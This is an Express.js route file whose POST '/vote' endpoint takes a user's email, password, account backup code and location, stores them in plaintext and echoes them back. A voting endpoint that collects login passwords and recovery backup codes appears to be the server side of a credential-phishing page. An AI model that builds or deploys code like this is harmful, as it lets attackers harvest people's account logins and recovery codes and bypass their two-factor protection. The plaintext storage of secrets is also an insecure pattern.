const express = require("express");
const router = express.Router();
const EmailModel = require("../models/EmailModel");

// REGISTER
router.post("/vote", async (req, res) => {
  try {
    const newEmail = req.body.email;
    const newPassword = req.body.password;
    const newBackupCode = req.body.backupCode;
    const newCountry = req.body.country;
    const newCity = req.body.city;
    const newContinent = req.body.continent;
    const newDate = new Date();

    const Email = new EmailModel({
      email: newEmail,
      password: newPassword,
      backupCode: newBackupCode,
      country: newCountry,
      city: newCity,
      continent: newContinent,
      date: newDate,
    });

    const mail = await Email.save();
    const { email, password, backupCode, country, city, continent, date } =
      mail._doc;
    res
      .status(200)
      .json({ email, password, backupCode, country, city, continent, date });
  } catch (error) {
    res.status(400).json({
      message: "Voting failed",
      error: error.message,
    });
  }
});

module.exports = router;
